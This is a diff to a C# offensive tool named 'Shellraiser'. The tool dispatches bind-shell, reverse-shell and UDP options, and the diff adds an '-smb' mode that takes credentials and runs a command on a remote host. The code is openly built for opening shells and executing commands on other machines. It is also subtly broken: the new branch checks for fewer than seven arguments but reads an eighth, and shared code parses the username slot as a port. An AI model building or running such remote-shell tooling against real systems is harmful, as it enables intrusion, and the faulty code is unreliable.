@@ -24,25 +24,43 @@ namespace Shellraiser
             string ipAddress = args[1];
             int port = int.Parse(args[2]);
 
+
             if (option == "-b")
             {
                 TCPBind(ipAddress, port);
             }
             else if (option == "-u")
             {
-                // call the UDPBind function with the provided IP address and port
                 UDPBind(ipAddress, port);
             }
             else if (option == "-r")
             {
-                // call the Reverse function with the provided IP address and port
                 Reverse(ipAddress, port);
             }
             else if (option == "-c")
             {
-                // UDP Client
                 UDPClient(ipAddress, port);
-            }    // 
+            }
+            else if (option == "-smb")
+            {
+                if (args.Length < 7)
+                {
+                    Console.WriteLine("Invalid number of arguments for -smb option. Usage: ShellRunner -smb IP_ADDRESS USERNAME PASSWORD SHARE PATH COMMAND ARGUMENT");
+                    return;
+                }
+
+                string ip = args[1];
+                string username = args[2];
+                string password = args[3];
+                string share = args[4];
+                string path = args[5];
+                string command = args[6];
+                string argument = args[7];
+                string unc = "smb://" + ip + "/" + share + "/" + path;
+
+                SMBShell smb = new SMBShell(ip, username, password, share, path, command, argument, unc);
+                smb.RunCommand();
+            }
             else
             {
                 Console.WriteLine("Invalid option. Usage: ");
@@ -285,7 +303,6 @@ namespace Shellraiser
             }
             udpListener.Close();
         }
-
 
         //
     }
